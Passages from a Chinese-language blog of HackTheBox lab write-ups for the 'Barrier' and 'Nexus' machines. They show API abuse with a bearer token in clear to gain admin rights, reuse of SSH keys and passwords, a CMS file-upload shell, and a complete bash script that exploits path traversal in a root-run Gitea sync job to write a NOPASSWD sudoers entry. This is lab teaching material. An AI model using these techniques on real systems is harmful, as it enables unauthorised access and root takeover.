"email": "admin@barrier.vl", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "c19f414ee26028d6fe42f90a393920de1c1f8b5428d3efe76b72f302efe78742", "path": "users", "type": "internal", "uuid": "4d9587ad-641d-4879-a8dd-edf2a24e1bf5" }, { "pk": 35, "username": "maki", "name": "maki", "is_active": true, "last_login": null, "is_superuser": false, "groups": [], "groups_obj": [], "email": "", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "6d9a5a5ca034c7dd59f0b63547f402ceed837476b2b43bc58338ed74630b8651", "path": "users", "type": "internal", "uuid": "5840e7f6-f396-493a-b41d-9433df6df996" }, { "pk": 34, "username": "satoru", "name": "satoru", "is_active": true, "last_login": "2026-03-06T13:22:11.766808Z", "is_superuser": false, "groups": [], "groups_obj": [], "email": "satoru@barrier.vl", "avatar": "data:image/svg+xml;base64,", "attributes": {}, "uid": "e0c306c91c800ecb0343d535bf8211fcd85ebeafb17966eb9a5b5146c99724cb", "path": "users", "type": "internal", "uuid": "91da4edd-f03d-4cdc-80af-102371b10905" } ]} 将用户添加到管理员组中可以发现能够变成超级管理员先试了一下satoru用户，但发现在guacamole应用上并没有权限 ░ curl -v -L 'http://barrier.vl:9000/api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/' \-H 'Content-Type: application/json' \-H "Authorization: Bearer $AUTHENTIK_API_TOKEN" \-d '{"pk": 34}'* Host barrier.vl:9000 was resolved.* IPv6: (none)* IPv4: 10.129.234.46* Trying 10.129.234.46:9000...* Connected to barrier.vl (10.129.234.46) port 9000* using HTTP/1.x> POST /api/v3/core/groups/a38fb983-8b71-4bf2-b5a7-42ab9fdd58e8/add_user/ HTTP/1.1> Host: barrier.vl:9000> User-Agent: curl/8.15.0> Accept: */*> Content-Type: application/json> Authorization: Bearer MqL8GPTr7y4EDMWsp7gxb2YiKEzuNpLZ2QVia8HD4MLc93vgublgL5xQEvTc> Content-Length: 10> * upload completely sent off: 10 bytes< HTTP/1.1 204 No Content< Allow: POST, OPTIONS< Date: Fri, 06 Mar 2026 14:38:29 GMT< Referrer-Policy: same-origin< Vary: Accept-Encoding< Vary: Cookie< X-Authentik-Id: a3dd8181785e43d39ed45a2f33a94bcc< X-Content-Type-Options: nosniff< X-Frame-Options: DENY< X-Powered-By: authentik> 或者创建一个新用户并将其加入管理员组中 curl -s -X POST 'http://barrier.vl:9000/api/v3/core/users/' -H 'Content-Type: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" -d '{"username":"xg","name":"xg","path":"users","is_active":true}' | jq .curl -s -X POST 'http://barrier.vl:9000/api/v3/core/users/36/set_password/' -H 'Content-Type: application/json' -H "Authorization: Bearer $AUTHENTIK_API_TOKEN" -d '{"password":"xg"}' | jq . 模拟maki用户的身份发现有个shell，连接进去后能拿到user.txt 找敏感信息在用户的ssh目录下能找到这样的文件，由于 ssh-rsa（使用 SHA-1 哈希）被认为在数学上不再足够安全，从 OpenSSH 8.8 版本开始，默认禁用了这种主机密钥算法。所以连接时加上 -oHostKeyAlgorithms=+ssh-rsa ssh -i ed25519 -o HostKeyAlgorithms=+ssh-rsa maki@barrier.vl 查看guacamole的配置文件，发现mysql的配置文件在数据库中找到了用户的私钥 select * from guacamole_connection_parameter 登陆 maki_adm@barrier:~$ cat .bash_historysudo su Va4kSjgTHSd55ZLv 在bash历史上找到密码，直接切换

entry.title: HackTheBox - Nexus
entry.content:
信息收集/htb/Linux/Nexus ▓▒░ nmap -p- -A --min-rate=10000 $ip ░▒▓ ✔  09:14:00 上午  Starting Nmap 7.95 ( https://nmap.org ) at 2026-06-26 09:14 CSTRTTVAR has grown to over 2.3 seconds, decreasing to 2.0Nmap scan report for nexus.htb (10.129.5.164)Host is up (6.2s latency).Not shown: 38365 closed tcp ports (reset), 27168 filtered tcp ports (no-response)PORT STATE SERVICE VERSION22/tcp open tcpwrapped| ssh-hostkey: | 256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)|_ 256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)80/tcp open tcpwrapped|_http-title: Nexus Energy Authority \xE2\x80\x94 Powering the Nation's Future|_http-server-header: nginx/1.24.0 (Ubuntu)Device type: general purposeRunning: Linux 4.X|5.XOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5OS details: Linux 4.15 - 5.19 只开了22和80端口将10.129.5.164 nexus.htb加入/etc/hosts中在这个界面发现两个邮箱，再枚举一下子域名得到一个git，将git.nexus.htb再加入到/etc/hosts中在一个仓库里发现一个子域名，billing.nexus.htb，再将其加入到/etc/hosts中在之前的提交找到一个密码，进入billing.nexus.htb是krayin的CMS用刚刚的两个账号进行尝试，登陆成功 CVE-2026-38526可以知道版本为2.2.0，可以发现一个CVE-2026-38526[^1] 或者写个poc上传文件弹shell在环境变量中找到一个数据库的密码尝试一下密码复用，home目录的Jones和git root发现Jones能成功登陆，上传linpeas.sh进行枚举发现有个3000端口，ssh将端口转发出来，发现是git服务 find / -iname "*gitea*" -o -iname "app.ini" 2>/dev/null/sys/fs/cgroup/system.slice/gitea.service/var/lib/gitea/etc/nginx/sites-available/nexus-gitea/etc/nginx/sites-enabled/nexus-gitea/etc/gitea/etc/gitea/app.ini/etc/systemd/system/multi-user.target.wants/gitea.service/etc/systemd/system/gitea-template-sync.timer/etc/systemd/system/gitea.service/etc/systemd/system/gitea-template-sync.service/etc/systemd/system/timers.target.wants/gitea-template-sync.timer/usr/local/bin/gitea/run/systemd/units/invocation:gitea.service 查找git的相关配置/etc/systemd/system/gitea-template-sync.service/etc/systemd/system/gitea-template-sync.timer说明系统里存在一个和 Gitea 模板同步相关的 systemd 定时任务 cat /etc/systemd/system/gitea-template-sync.service[Unit]Description=Sync Gitea templatesAfter=network-online.target[Service]Type=oneshotUser=rootExecStart=/usr/bin/python3 /etc/gitea/template-sync.pyTimeoutStartSec=50sjones@nexus:~$ cat /etc/gitea/template-sync.pyimport osimport sysimport jsonimport subprocessimport timeimport urllib.requestGITEA_URL = "http://localhost:3000"REPO_ROOT = "/var/lib/gitea/data/gitea-repositories"STAGING_DIR = "/home/git/template-staging"LOG_FILE = "/var/log/template-sync.log"def log(msg): ts = time.strftime("%Y-%m-%d %H:%M:%S") line = "[%s] %s" % (ts, msg) print(line, flush=True) try: os.makedirs(os.path.dirname(LOG_FILE), exist_ok=True) with open(LOG_FILE, 'a') as f: f.write(line + '
') except: passdef load_config(): config = {} for path in ['/etc/gitea/template-sync.conf', '/opt/forge/app/.env']: try: with open(path) as f: for line in f: line = line.strip() if line and not line.startswith('#') and '=' in line: k, v = line.split('=', 1) config[k.strip()] = v.strip() except: pass return configdef get_token(): cfg = load_config() return cfg.get('GITEA_API_TOKEN')def get_template_repos(token): url = "%s/api/v1/repos/search?limit=50" % GITEA_URL req = urllib.request.Request(url, headers={ 'Authorization': 'token %s' % token }) try: with urllib.request.urlopen(req) as resp: data = json.loads(resp.read()) repos = data.get('data', data) if isinstance(data, dict) else data return [r for r in repos if r.get('template', False)] except Exception as e: log("API error: %s" % e) return []def sync_template(repo_info): owner = repo_info['owner']['login'] name = repo_info['name'].lower() bare_path = os.path.join(REPO_ROOT, owner, "%s.git" % name) stage_path = os.path.join(STAGING_DIR, owner, name) if not os.path.isdir(bare_path): log(" repo not found: %s" % bare_path) return # Read tree entries from the bare repository try: GIT = ['git', '-c', 'safe.directory=*'] result = subprocess.run( GIT + ['ls-tree', '-r', 'HEAD'], cwd=bare_path, capture_output=True, text=True, timeout=10 ) if result.returncode != 0: log(" ls-tree failed: %s" % result.stderr.strip()) return except Exception as e: log(" ls-tree error: %s" % e) return entries = [] for line in result.stdout.strip().split('
'): if not line: continue parts = line.split('	', 1) if len(parts) != 2: continue meta, filepath = parts mode, objtype, objhash = meta.split() if objtype == 'blob': entries.append((mode, objhash, filepath)) if not entries: log(" no files in template") return # Extract files to staging directory for mode, objhash, filepath in entries: target = os.path.join(stage_path, filepath) target_dir = os.path.dirname(target) try: os.makedirs(target_dir, exist_ok=True) GIT = ['git', '-c', 'safe.directory=*'] cat_result = subprocess.run( GIT + ['cat-file', 'blob', objhash], cwd=bare_path, capture_output=True, timeout=10 ) if cat_result.returncode != 0: continue with open(target, 'wb') as f: f.write(cat_result.stdout) if mode == '100755': os.chmod(target, 0o755) else: os.chmod(target, 0o644) log(" synced: %s" % filepath) except Exception as e: log(" error syncing %s: %s" % (filepath, e))def main(): log("Template sync starting") token = get_token() if not token: log("No API token found") sys.exit(1) templates = get_template_repos(token) log("Found %d template repo(s)" % len(templates)) for repo in templates: name = repo['full_name'] log("Syncing template: %s" % name) sync_template(repo) log("Template sync complete")if __name__ == '__main__': main()
gitea-template-sync.service说明系统会每分钟以 root 身份执行一次，审计一下template-sync.py通过 Gitea API 搜索所有仓库，并筛选出 template 属性为 true 的模板仓库。之后对每个模板仓库执行同步到/home/git/template-staging/，但是发现 target = os.path.join(stage_path, filepath) 对于同步后的并没有对路径进行限制，创建一个pwn仓库/home/git/template-staging/jones/pwn/，而在后加5个../home/git/template-staging/jones/pwn/../../../../../etc/sudoers.d/jones，最后会变成/etc/sudoers.d/jones创建一个仓库，将其设置为模版仓库，进入tmp文件夹下 mkdir evilrepocd evilrepogit init -qgit config user.email pwn@nexus.htbgit config user.name pwngit symbolic-ref HEAD refs/heads/main 然后写payload #!/bin/bash set -e REPO_URL="${1:-http://localhost:3000/jones/pwn.git}" TARGET_USER="${2:-jones}" BRANCH="${3:-main}" WORKDIR="/tmp/evilrepo" echo "[+] Repo URL: $REPO_URL" echo "[+] Target user: $TARGET_USER" echo "[+] Branch: $BRANCH" rm -rf "$WORKDIR" mkdir -p "$WORKDIR" cd "$WORKDIR" git init -q git config user.email pwn@nexus.htb git config user.name pwn git symbolic-ref HEAD "refs/heads/$BRANCH" echo "[+] Creating sudoers payload..." blob=$(printf '%s ALL=(ALL) NOPASSWD:ALL
' "$TARGET_USER" | git hash-object -w --stdin) echo "[+] Building malicious git tree..." t1=$(printf "100644 blob %s	%s
" "$blob" "$TARGET_USER" | git mktree) t2=$(printf "040000 tree %s	sudoers.d
" "$t1" | git mktree) t3=$(printf "040000 tree %s	etc
" "$t2" | git mktree) t="$t3" for i in 1 2 3 4 5; do t=$(printf "040000 tree %s	..
" "$t" | git mktree) done commit=$(echo "evil sudoers" | git commit-tree "$t") git update-ref "refs/heads/$BRANCH" "$commit" echo "[+] Malicious tree:" git ls-tree -r HEAD echo "[+] Pushing to Gitea..." git remote add origin "$REPO_URL" git push -f origin "$BRANCH" echo "[+] Also trying to push to master, in case Gitea default branch is master..." git push -f origin "$BRANCH:master" 2>/dev/null || true echo echo "[+] Done." echo "[+] Now wait for root timer:" echo " tail -f /var/log/template-sync.log" echo echo "[+] Then run:" echo " sudo -l" echo " sudo /bin/bash -p" 拿到root。[^1]: 在 /admin/tinymce/upload 接口中，系统缺乏对上传文件的严格限制。已认证的攻击者可借此上传恶意的 PHP 文件
